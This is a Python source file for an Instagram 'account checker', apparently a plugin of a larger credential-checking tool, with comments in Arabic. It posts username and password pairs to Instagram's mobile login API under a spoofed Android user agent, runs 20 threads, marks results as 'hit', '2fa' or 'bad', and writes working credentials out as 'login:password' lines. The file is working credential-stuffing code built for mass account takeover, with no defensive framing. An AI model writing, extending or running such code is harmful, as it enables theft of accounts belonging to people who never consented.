from core.base_checker import BaseChecker
from typing import Dict, Any
import requests
from uuid import uuid4

class InstagramChecker(BaseChecker):
    """Instagram account checker"""
    
    LOGIN_URL = 'https://b.i.instagram.com/api/v1/accounts/login/'
    
    def get_threads(self) -> int:
        return 20  # Instagram يتحمل 20 ثريد
    
    def check_account(self, username: str, password: str) -> Dict[str, Any]:
        try:
            uid = str(uuid4())
            
            headers = {
                'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'
            }
            
            data = {
                'uuid': uid,
                'password': password,
                'username': username,
                'device_id': uid,
                'from_reg': 'false',
                '_csrftoken': 'missing',
                'login_attempt_count': '0'
            }
            
            response = requests.post(self.LOGIN_URL, headers=headers, data=data, timeout=15)
            
            account_data = {
                "login": username,
                "password": password,
                "status": "unknown"
            }
            
            if 'logged_in_user' in response.text:
                account_data["status"] = "hit"
                should_save = True
            elif 'challenge_required' in response.text or 'confirm that you own this' in response.text:
                account_data["status"] = "2fa"
                should_save = True  # نحفظ حتى 2FA
            else:
                account_data["status"] = "bad"
                should_save = False
            
            return {
                "status": "valid" if should_save else "bad",
                "account_data": account_data,
                "should_save": should_save
            }
            
        except Exception as e:
            return {"status": "error", "username": username, "error": str(e)}
    
    def should_save(self, account_data: Dict[str, Any]) -> bool:
        return account_data.get("status") in ["hit", "2fa"]
    
    def save_format(self, account_data: Dict[str, Any]) -> str:
        return f"{account_data['login']}:{account_data['password']} | status={account_data['status']}\n"

